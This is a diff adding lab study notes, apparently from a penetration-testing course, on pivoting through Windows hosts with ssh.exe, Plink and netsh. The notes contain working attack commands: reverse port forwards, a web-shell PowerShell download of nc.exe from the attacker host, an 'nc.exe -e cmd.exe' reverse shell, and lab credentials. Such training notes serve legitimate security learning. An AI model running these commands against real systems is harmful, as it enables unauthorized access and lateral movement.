@@ -540,3 +540,148 @@ Unable to connect with SMB1 -- no workgroup available
 
 ## Port Forwarding with Windows Tools
 
+### ssh.exe
+
+```
+192.168.212.64 MULTISERVER03
+10.4.212.215 PGDATABASE01
+```
+
+OpenSSH clients since version 1803 are bundled with Windows by default and are feature-on-demand since version 1709. We'll find scp.exe, sftp.exe, ssh.exe, as well as ssh-* utils in %systemdrive%\Windows\System32\OpenSSH by default.
+
+We can connect to any SSH server (even if not Windows compiled) as long as we have the credentials.
+
+Let's create a remote dynamic port forward from MULTISERVER03 to Kali. In this case, we can RDP to MULTISERVER03, but we can't bind any other ports to the WAN iface. 
+
+We'll use creds we already found to RDP and then use ssh.exe to remote dynamic port forward to Kali. We'll use that port forward to connect to PGDATABASE01.
+
+```console
+kali$ sudo systemctl start ssh
+
+kali$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.212.64
+```
+
+Open cmd on the RDP session.
+
+```console
+rdp_admin> where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+
+// version is higher than 7.6, so we can use it for remote dynamic port forwarding
+
+rdp_admin> ssh.exe -V
+OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+
+rdp_admin>ssh -N -R 9998 kali@192.168.45.245
+```
+
+Back to Kali.
+
+```console
+// checking it's working
+kali$ ss -ntplu
+
+kali$ tail /etc/proxychains4.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+// now run psql through proxychains
+
+kali$ proxychains psql -h 10.4.212.215 -U postgres
+
+postgres# \l
+confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+```
+
+### Plink
+
+We won't always find an OpenSSH client. We can look for PuTTY and it's cmd line only counterpart, Plink.
+
+NOTE: Plink does not have remote dynamic port forwarding.
+
+```
+192.168.212.64 MULTISERVER03
+```
+
+Imagine MULTISERVER03 now has a web app on port 80, and we have no RDP or any other inbound port.
+
+We can drop a web shell on the server and gain reverse shell. We'll use creds we already found and create remote port forward using Plink.
+
+In our reverse shell, our commands run as the iis apppool\defaultapppool user. We'll use the web shell to download nc.exe to MULTISERVER03 and use nc to send a reverse shell back to Kali.
+
+We need to host a server for MULTISERVER03 to be able to download nc. 
+
+```console
+// start web server
+kali$ sudo systemctl start apache2
+
+// find nc
+kali$ find / -name nc.exe 2>/dev/null
+
+// copy it to the apache root
+$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
+```
+
+Use this PowerShell one-liner in the web app injection to download nc on the server.
+
+```
+powershell wget -Uri http://192.168.45.245/nc.exe -OutFile C:\Windows\Temp\nc.exe
+```
+
+The server downloaded nc. Set up a listener.
+
+```console
+kali$ nc -nvlp 4446
+```
+
+With the web shell again, execute nc.
+
+```
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.245 4446
+```
+
+Now, download Plink to MULTISERVER03.
+
+```console
+kali$ find / -name plink.exe 2>/dev/null
+
+kali$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
+
+// now go back to the reverse shell we got in the listener
+
+c:\windows\system32\inetsrv> powershell wget -Uri http://192.168.45.245/plink.exe -OutFile C:\Windows\Temp\plink.exe
+```
+
+Set up a Plink remote port forward so we can access the MULTISERVER03 RDP port from Kali.
+
+```console
+c:\windows\system32\inetsrv> C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.245
+```
+
+NOTE: If you're in a limited shell and cannot answer follow-up prompts, add "cmd.exe /c echo y," to your command. The full commannd here would be "cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.245".
+
+```console
+// confirm port has opened
+$ ss -ntplu
+```
+
+Now, we can connect to 9983 on Kali's loopback iface with xfreerdp.
+
+```console
+kali$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+```
+
+### Netsh
+
+Windows has a native way to create a port forward. The firewall config tool Netsh (Network Shell) allows us to set up a port forward with the portproxy subcontext within the interface context. 
+
+Netsh requires admin privileges.
+
